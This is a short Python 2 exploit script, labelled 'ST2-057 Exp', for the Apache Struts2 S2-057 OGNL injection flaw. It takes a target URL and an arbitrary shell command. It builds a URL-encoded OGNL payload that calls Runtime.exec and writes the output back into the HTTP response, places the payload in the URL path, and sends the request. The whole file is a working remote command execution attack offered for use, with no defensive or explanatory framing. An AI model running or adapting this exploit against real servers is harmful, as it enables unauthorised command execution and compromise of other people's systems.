#-*-coding:utf-8-*-
# Author: Fplyth0ner
# ST2-057 Exp
# Bug project Framework Moudle

import sys
import requests

url = sys.argv[1]
command = sys.argv[2]
url_list = [i for i in url.split("/") if i != '']

payload = "%24%7b(%23_memberAccess%5b%22allowStaticMethodAccess%22%5d%3dtrue%2c%23a%3d%40java.lang.Runtime%40getRuntime().exec(%27"+command+"%27).getInputStream()%2c%23b%3dnew+java.io.InputStreamReader(%23a)%2c%23c%3dnew++java.io.BufferedReader(%23b)%2c%23d%3dnew+char%5b51020%5d%2c%23c.read(%23d)%2c%23combie%3d+%40org.apache.struts2.ServletActionContext%40getResponse().getWriter()%2c%23combie.println(%23d+)%2c%23combie.close())%7d"

payload = "/" + payload + "/"
num = 0
for str in url_list:
	num += 1
	if num == 1:
		nurl = str
		continue
	elif num == 2:
		nurl = nurl + "//" + str
		continue
	elif num == len(url_list):
		nurl = nurl + payload + str
		continue
	else:
		nurl = nurl + "/" + str
		continue

try:
	r = requests.get(nurl)
except:
	print "ERROR!"
	exit()
print "OK!"